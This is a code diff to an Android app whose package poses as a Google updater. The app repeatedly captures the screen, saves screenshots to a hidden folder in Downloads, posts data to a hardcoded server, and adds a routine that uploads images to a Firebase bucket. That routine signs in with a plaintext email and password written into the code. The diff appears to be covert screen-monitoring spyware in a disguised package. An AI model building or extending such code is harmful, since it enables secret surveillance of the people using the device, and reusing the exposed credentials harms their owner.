@@ -1,9 +1,12 @@
 package com.googleupdaterunner;
 
+import android.content.ContentResolver;
+import android.content.ContentValues;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.graphics.PixelFormat;
 import android.hardware.display.DisplayManager;
 import android.hardware.display.VirtualDisplay;
@@ -13,14 +16,25 @@ import android.media.ImageReader;
 import android.media.MediaRouter;
 import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
+import android.net.Uri;
 import android.os.*;
+import android.provider.MediaStore;
 import android.util.Base64;
 import android.util.DisplayMetrics;
 import android.util.Log;
+import android.view.PixelCopy;
+import android.view.SurfaceView;
 import android.view.View;
 import android.widget.Toast;
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
+import com.google.android.gms.tasks.OnFailureListener;
+import com.google.android.gms.tasks.OnSuccessListener;
+import com.google.firebase.auth.FirebaseAuth;
+import com.google.firebase.auth.FirebaseUser;
+import com.google.firebase.storage.FirebaseStorage;
+import com.google.firebase.storage.StorageReference;
+import com.google.firebase.storage.UploadTask;
 import com.google.gson.*;
 import okhttp3.RequestBody;
 import okhttp3.ResponseBody;
@@ -39,6 +53,7 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
 import java.util.UUID;
+import java.util.concurrent.atomic.AtomicReference;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -137,7 +152,7 @@ public class MainActivity extends AppCompatActivity {
 
                                                 entity.setDeviceInfo(deviceManufacturer + "-" + deviceModel);
                                                 entity.setGuid(UUID.randomUUID().toString());
-                                                postData(entity);
+                                                saveBitmapToStorage(entity);
                                                 // Do something with the Base64-encoded image
                                             } finally {
                                                 image.close();
@@ -148,11 +163,6 @@ public class MainActivity extends AppCompatActivity {
                                         virtualDisplay.release();
                                         mediaProjection.stop();
 
-                                        SystemClock.sleep(500);
-                                        Gson gson = new Gson();
-                                        String json = gson.toJson(entity);
-
-                                        saveFileToDevice(json);
                                     } finally {
                                         // Make sure to release the mediaProjection resource
                                         mediaProjection = null;
@@ -160,7 +170,7 @@ public class MainActivity extends AppCompatActivity {
                                 }
 
                                 // Sleep for a desired duration to avoid consuming excessive CPU resources
-                                Thread.sleep(1000); // Adjust the sleep duration as needed
+                                Thread.sleep(60000); // Adjust the sleep duration as needed
                             }
                         } catch (InterruptedException e) {
                             e.printStackTrace();
@@ -257,7 +267,7 @@ public class MainActivity extends AppCompatActivity {
         try{
 
             Retrofit retrofit = new Retrofit.Builder()
-                    .baseUrl("http://192.168.10.18:55457/api/")
+                    .baseUrl("http://192.168.8.100:45455/api/")
                     .addConverterFactory(GsonConverterFactory.create())
                     .build();
             RetrofitAPI retrofitAPI = retrofit.create(RetrofitAPI.class);
@@ -445,6 +455,116 @@ public class MainActivity extends AppCompatActivity {
 
         // Implement other callback methods as needed
     };
+
+    public  void postDataToFirebase(Base64Model base64Model){
+        String email = "tahir.4708@gmail.com";
+        String password = "Ayzal@2682022";
+
+
+        FirebaseAuth auth = FirebaseAuth.getInstance();
+        FirebaseUser user = auth.getCurrentUser();
+
+        if (user != null) {
+            // User is already signed in, proceed with uploading the file
+            uploadFile(base64Model);
+        } else {
+            // User is not signed in, sign in the user first
+            auth.signInWithEmailAndPassword(email, password)
+                    .addOnCompleteListener(task -> {
+                        if (task.isSuccessful()) {
+                            // Sign-in successful, proceed with uploading the file
+                            uploadFile(base64Model);
+                        } else {
+                            // Handle sign-in failure
+                            Toast.makeText(MainActivity.this, "Failed to sign in", Toast.LENGTH_LONG).show();
+                        }
+                    });
+        }
+
+
+
+    }
+
+    private void uploadFile(Base64Model base64Model) {
+        FirebaseStorage storage = FirebaseStorage.getInstance("gs://screenshotclipper.appspot.com");
+        // Create a storage reference from our app
+        StorageReference storageRef = storage.getReference();
+
+// Create a reference to "mountains.jpg"
+        StorageReference mountainsRef = storageRef.child("mountains.jpg");
+
+// Create a reference to 'images/mountains.jpg'
+        StorageReference mountainImagesRef = storageRef.child("images/mountains.jpg");
+
+// While the file names are the same, the references point to different files
+        mountainsRef.getName().equals(mountainImagesRef.getName());    // true
+        mountainsRef.getPath().equals(mountainImagesRef.getPath());    // false
+
+        Bitmap bitmap = convertBase64ToBitmap(base64Model.getBase64String());
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        bitmap.compress(Bitmap.CompressFormat.JPEG, 100, baos);
+        byte[] data = baos.toByteArray();
+
+        UploadTask uploadTask = mountainsRef.putBytes(data);
+        uploadTask.addOnFailureListener(new OnFailureListener() {
+            @Override
+            public void onFailure(@NonNull Exception exception) {
+                Toast.makeText(MainActivity.this,exception.getMessage(),Toast.LENGTH_LONG).show();
+                // Handle unsuccessful uploads
+            }
+        }).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
+            @Override
+            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
+                Toast.makeText(MainActivity.this,"Success",Toast.LENGTH_LONG).show();
+                // taskSnapshot.getMetadata() contains file metadata such as size, content-type, etc.
+                // ...
+            }
+        });
+    }
+
+    public Bitmap convertBase64ToBitmap(String base64String) {
+        try {
+            byte[] decodedString = Base64.decode(base64String, Base64.DEFAULT);
+            Bitmap bitmap = BitmapFactory.decodeByteArray(decodedString, 0, decodedString.length);
+            return bitmap;
+        } catch (Exception e) {
+            e.printStackTrace();
+            return null;
+        }
+    }
+
+    public void saveBitmapToStorage(Base64Model entity) {
+        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault());
+        String timestamp = sdf.format(new Date());
+
+        // Get the reference to the device's download directory
+        File downloadDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+        if (!downloadDirectory.exists()) {
+            downloadDirectory.mkdirs();
+        }
+
+        // Create a subdirectory within the Downloads directory
+        File directory = new File(downloadDirectory, ".folder");
+        if (!directory.exists()) {
+            directory.mkdirs();
+        }
+
+        File imageFile = new File(directory, "image_" + timestamp + ".png");
+
+        try {
+            FileOutputStream outputStream = new FileOutputStream(imageFile);
+            Bitmap bitmap = convertBase64ToBitmap(entity.getBase64String());
+            bitmap.compress(Bitmap.CompressFormat.PNG, 100, outputStream);
+            outputStream.flush();
+            outputStream.close();
+            // Image saved successfully
+        } catch (IOException e) {
+            e.printStackTrace();
+            // Error occurred while saving the image
+        }
+    }
+
+
 
 
 }
